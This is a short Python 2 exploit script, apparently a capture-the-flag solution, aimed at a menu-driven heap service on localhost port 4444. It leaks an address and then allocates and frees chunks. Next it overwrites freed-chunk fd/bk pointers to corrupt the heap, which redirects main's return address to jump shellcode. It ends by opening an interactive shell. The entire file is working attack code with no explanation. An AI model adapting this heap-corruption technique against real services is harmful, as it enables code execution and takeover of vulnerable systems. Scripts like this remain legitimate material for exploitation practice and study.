# -*- coding: utf-8 -*-
from m1z0r3 import *

ip = "localhost"
port = 4444
s,f = sock(ip,port)

def alloc(size):
  read_until(f,"| ")
  s.send("A")
  s.send(str(size)+"\n")

def free(num):
  read_until(f,"| ")
  s.send("F")
  read_until(f,"Index: ")
  s.send(str(num)+"\n")

def write(num,buf):
  read_until(f,"| ")
  s.send("W")
  for _ in range(num):
    addr = int(read_until(f).split(" ")[1][2:],16)
  read_until(f,"where: ")
  s.send(str(num)+"\n")
  read_until(f,"what: ")
  s.send(buf)
  return addr

def exit():
  read_until(f)
  s.send("E")
  read_until(f)

# get [N] addr
read_until(f,"| ")
s.send("N")
read_until(f,"go: ")
n_addr = int(read_until(f)[2:-1],16)
ret_addr = n_addr + 0x13c
print "[+] ret_addr %16x" % ret_addr

# Allocate & Free Chunks
alloc(128)
alloc(64)
alloc(32)
alloc(32)
alloc(32)
free(2)
free(4)

# get shell_addr & chunk_addr
shell_addr = write(1,jmp_shellcode_x64)
four_addr = write(4,"A")

# Overwrite fd & bk
buf = "A"*48
buf += p64(shell_addr)
buf += p64(four_addr)
write(2,buf)

# make dummy chunk
buf = p64(ret_addr-four_addr+8)
write(4,buf)

# Overwrite return address from main function
alloc(64)

# get shell
exit()

shell(s)
